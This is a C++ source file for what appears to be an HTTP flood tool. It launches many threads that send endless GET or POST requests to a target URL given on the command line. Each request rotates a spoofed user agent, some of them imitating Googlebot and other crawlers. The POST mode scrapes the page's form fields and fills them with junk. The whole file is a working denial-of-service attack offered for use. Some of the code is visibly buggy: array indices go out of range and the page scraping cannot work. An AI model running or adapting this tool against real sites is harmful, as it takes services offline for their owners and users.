#include <iostream>
#include <string>
#include <curl/curl.h>
#include <vector>
#include <thread>
#include <algorithm>

int threads = 12;
std::string method = "get";
std::vector<std::string> field_names = {};
std::vector<std::string> platforms = { "Macintosh", "Windows", "X11" };
std::vector<std::string> mac = { "68K", "PPC", "Intel Mac OS X" };
std::vector<std::string> windows = { "Win3.11", "WinNT3.51", "WinNT4.0", "Windows NT 5.0", "Windows NT 5.1", "Windows NT 5.2", "Windows NT 6.0", "Windows NT 6.1", "Windows NT 6.2", "Win 9x 4.90", "WindowsCE", "Windows XP", "Windows 7", "Windows 8", "Windows NT 10.0; Win64; x64" };
std::vector<std::string> linux = { "Linux i686", "Linux x86_64" };
std::vector<std::string> browsers = { "chrome", "spider", "ie" };
std::vector<std::string> tokens = { ".NET CLR", "SV1", "Tablet PC", "Win64; IA64", "Win64; x64", "WOW64" };
std::vector<std::string> spiders = { "AdsBot-Google ( http://www.google.com/adsbot.html)", "Baiduspider ( http://www.baidu.com/search/spider.htm)", "FeedFetcher-Google; ( http://www.google.com/feedfetcher.html)", "Googlebot/2.1 ( http://www.googlebot.com/bot.html)", "Googlebot-Image/1.0", "Googlebot-News", "Googlebot-Video/1.0" };

class InputParser {
public:
  InputParser(int& argc, char** argv) { for (int i = 1; i < argc; ++i) this->tokens.push_back(std::string(argv[i])); }
  const std::string& get_arg(const std::string& option) {
    std::vector<std::string>::const_iterator itr;
    itr = std::find(this->tokens.begin(), this->tokens.end(), option);
    if (itr != this->tokens.end() && ++itr != this->tokens.end()) return *itr;
    return std::string("");
  }
  bool arg_exists(const std::string& option) { return std::find(this->tokens.begin(), this->tokens.end(), option) != this->tokens.end(); }
private:
  std::vector <std::string> tokens;
};

size_t parse_response(void* ptr, size_t size, size_t count, void* stream) {
  return size * count;
}

std::string make_user_agent() {
  std::string os;
  std::string version;
  std::string browser;
  std::string webkit;
  std::string platform = platforms[rand() % 2 + 1];
  if (platform == "Macintosh") os = mac[rand() % 2 + 1];
  else if (platform == "Windows") os = windows[rand() % 2 + 1];
  else if (platform == "X11") os = linux[rand() % 1 + 1];
  browser = "chrome";
  if (browser == "chrome") {
    webkit = std::to_string(rand() % 599 + 1);
    version = std::to_string(rand() % 99 + 1) + ".0" + std::to_string(rand() % 9999 + 1) + *"." + std::to_string(rand() % 999 + 1);
    return "Mozilla/5.0 (" + os + ") AppleWebKit/" + webkit + ".0 (KHTML, like Gecko) Chrome/" + version + " Safari/" + webkit;
  }
  else if (browser == "ie") {
    version = std::to_string(rand() % 99 + 1) + ".0";
    std::string engine = std::to_string(rand() % 99 + 1) + ".0";
    std::string token;
    if (rand() % 100 + 1 >= 50) {
      token = tokens[rand() % 5 + 1];
    }
    return "Mozilla/5.0 (compatible; MSIE " + version + "; " + os + "; " + token + "Trident/" + engine + ")";
  }
  return spiders[rand() % 6 + 1];
}

void get_fields(std::string target) {
  std::string html;
  CURL* curl = curl_easy_init();
  curl_easy_setopt(curl, CURLOPT_URL, target.c_str());
  curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, parse_response);
  curl_easy_setopt(curl, CURLOPT_WRITEDATA, &html);
  CURLcode res = curl_easy_perform(curl);
  curl_easy_cleanup(curl);
  for (std::string::size_type i = 0; i < html.size(); i++) {
    if (html.substr(i, 6) == "<input") {
      for (int x = i + 6; x < html.size(); x++) {
        if (html.substr(x, 5) == "name=") {
          for (int n = x + 6; n < html.size(); n++) {
            if (html.substr(n, 1) == "\"" || html.substr(n, 1) == "'") {
              field_names.push_back(html.substr(x + 6, n - (x + 6)));
              n = html.size();
            }
          }
        }
      }
    }
  }
}

void post(std::string target) {
  std::string field_data;
  get_fields(target);
  for (std::string& name : field_names) field_data += "&" + name + "uwu";
  while (true) {
    CURL* curl = curl_easy_init();
    curl_easy_setopt(curl, CURLOPT_URL, target.c_str());
    curl_easy_setopt(curl, CURLOPT_POST, 1);
    if (field_data.size()) {
      field_data = field_data.substr(1);
      curl_easy_setopt(curl, CURLOPT_POSTFIELDS, field_data.c_str());
    }
    else curl_easy_setopt(curl, CURLOPT_POSTFIELDS, "");
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, parse_response);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, make_user_agent().c_str());
    curl_easy_perform(curl);
  }
}

void get(std::string target) {
  while (true) {
    CURL* curl = curl_easy_init();
    curl_easy_setopt(curl, CURLOPT_URL, target.c_str());
    curl_easy_setopt(curl, CURLOPT_HTTPGET, 1L);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, make_user_agent().c_str());
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, &parse_response);
    curl_easy_perform(curl);
    curl_easy_cleanup(curl);
  }
}

int main(int argc, char* argv[]) {
  curl_global_init(CURL_GLOBAL_ALL);
  std::string target;
  InputParser input(argc, argv);
  if (input.arg_exists("-t")) threads = atoi(input.get_arg("-t").c_str());
  if (input.arg_exists("-u")) target = input.get_arg("-u");
  if (input.arg_exists("-m")) {
    method = input.get_arg("-m");
    std::transform(method.begin(), method.end(), method.begin(), [](unsigned char c) {return std::tolower(c); });
  }
  std::vector<std::thread> thread_vector;
  for (int i = 0; i < threads; i++) {
    if (method == "postget" || method == "getpost") {
      thread_vector.push_back(std::thread(get, target));
      thread_vector.push_back(std::thread(post, target));
    }
    else if (method == "post") {
      thread_vector.push_back(std::thread(post, target));
    }
    else thread_vector.push_back(std::thread(get, target));
  }
  for (std::thread& thread : thread_vector) if (thread.joinable()) thread.join();
}
